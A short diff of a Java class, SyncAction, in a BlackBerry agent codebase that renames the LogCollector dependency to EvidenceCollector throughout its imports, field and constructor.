@@ -3,10 +3,10 @@ package blackberry.action;
 import blackberry.AgentManager;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.Transport;
-import blackberry.log.LogCollector;
+import blackberry.evidence.EvidenceCollector;
 
 public abstract class SyncAction extends SubAction{        
-    protected LogCollector logCollector;
+    protected EvidenceCollector logCollector;
     protected AgentManager agentManager;
    // protected Transport[] transports = new Transport[Transport.NUM];
     protected Transport transport;
@@ -14,7 +14,7 @@ public abstract class SyncAction extends SubAction{
     
     public SyncAction(int actionId) {
         super(actionId);
-        logCollector = LogCollector.getInstance();
+        logCollector = EvidenceCollector.getInstance();
         agentManager = AgentManager.getInstance();
     }
 
